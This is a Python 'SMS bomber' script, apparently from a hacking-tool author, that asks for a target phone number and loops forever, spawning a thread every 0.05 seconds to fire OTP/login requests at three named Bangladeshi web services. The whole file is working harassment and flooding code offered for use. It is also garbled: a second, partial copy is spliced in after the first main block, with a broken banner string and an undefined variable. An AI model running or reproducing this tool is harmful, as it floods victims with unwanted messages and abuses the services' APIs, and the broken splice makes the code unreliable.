import requests
import time
import os
import signal
import threading
import random

# --- Handle CTRL+C to Exit ---
def signal_handler(sig, frame):
    print("\n\n\033[1;31m[-] Stopping the tool... Good Bye! \033[0m")
    os._exit(0)

signal.signal(signal.SIGINT, signal_handler)

# --- Password Protection ---
def check_password():
    os.system('clear')
    correct_pass = "saeid9.90"
    print("\033[1;36m" + "-"*45 + "\033[0m")
    print("\033[1;33m          🔓 SECURITY CHECK 🔓\033[0m")
    print("\033[1;36m" + "-"*45 + "\033[0m")
    
    user_pass = input("\033[1;34m[?] Enter Password to Access: \033[0m")
    
    if user_pass == correct_pass:
        print("\033[1;32m\n[✓] Access Granted! Welcome @saeid9.90\033[0m")
        time.sleep(1.5)
        return True
    else:
        print("\033[1;31m\n[×] Access Denied! Wrong Password.\033[0m")
        exit()

# --- Professional Large Banner ---
def show_banner():
    os.system('clear')
    print("""\033[1;32m
 ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
 ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
 ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
 ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
 ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
 ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                     
 ███╗   ███╗ ██████╗ ██████╗ ███████╗                
 ████╗ ████║██╔═══██╗██╔══██╗██╔════╝                
 ██╔████╔██║██║   ██║██║  ██║█████╗                  
 ██║╚██╔╝██║██║   ██║██║  ██║██╔══╝                  
 ██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗                
 ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝                
\033[1;36m-----------------------------------------------------
\033[1;33m 🌟 Developed by : @saeid9.90
\033[1;33m 🚀 Tool Version : 3.0 (Unlimited Mode)
\033[1;36m-----------------------------------------------------\033[0m""")

# --- Multi-API Function ---
def bomb(number):
    # একাধিক API লিস্ট যাতে ব্লক না হয়
    apis = [
        f"https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en&number={number}",
        f"https://www.quizgiri.xyz/api/v1/auth/login?phone={number}",
        f"https://shikho.com/api/auth/send-otp?phone={number}"
    ]
    
    api_url = random.choice(apis)
    try:
        if "bioscopelive" in api_url:
            requests.post(api_url, json={"number": number}, timeout=5)
        else:
            requests.get(api_url, timeout=5)
        print(f"\033[1;32m[✓] Request Sent successfully!\033[0m")
    except:
        print(f"\033[1;31m[×] Request Failed!\033[0m")

def start():
    check_password()
    show_banner()
    
    num = input("\033[1;34m[?] Target Number: \033[0m").strip()
    print(f"\n\033[1;33m[*] Starting Ultra-Fast Unlimited Attack on: {num}\033[0m\n")

    while True:
        # Threading ব্যবহার করে অতি দ্রুত পাঠানো
        t = threading.Thread(target=bomb, args=(num,))
        t.start()
        time.sleep(0.05) # স্পিড কন্ট্রোল

if __name__ == "__main__":
    start()
 ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝                
\033[1;36m-----------------------------------------------------
\033[1;33m 🌟 Developed by : @saeid9.90
\033[1;33m 🚀 Tool Version : 3.0 (Unlimited)
\033[1;36m-----------------------------------------------------
\033[0m"""
    print(large_banner)

TARGET_API = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"

def send_request(user_number):
    try:
        # দ্রুত পাঠানোর জন্য হেডার এবং পেলোড
        response = requests.post(TARGET_API, json={"country": "BD", "platform": "web", "language": "en", "number": user_number}, timeout=5)
        if response.status_code == 200:
            print(f"\033[1;32m[✓] Request successfully sent! \033[0m")
        else:
            print(f"\033[1;31m[×] Request failed! \033[0m")
    except:
        pass

def send_continuous_requests_fast():
    check_password()
    show_banner()
    
    while True:
        user_number = input("\033[1;34m[?] Enter Phone Number (e.g., 01xxxxxxxxx): \033[0m").strip()
        if user_number.isdigit() and len(user_number) >= 11:
            break
        else:
            print("\033[1;31m[×] Invalid Number! Try again.\033[0m")
    
    print(f"\n\033[1;36m[*] Starting Unlimited Fast Requests for {user_number}...\033[0m")
    print("\033[1;31m[*] Press CTRL+C to stop the tool.\n\033[0m")

    # আনলিমিটেড এবং দ্রুত পাঠানোর লুপ
    while True:
        # একসাথে অনেকগুলো থ্রেড কাজ করবে স্পিড বাড়ানোর জন্য
        t = threading.Thread(target=send_request, args=(user_number,))
        t.start()
        
        # অতি দ্রুত পাঠানোর জন্য ডিলে কমানো হয়েছে
        time.sleep(0.05) 

if __name__ == "__main__":
    send_continuous_requests_fast()
    
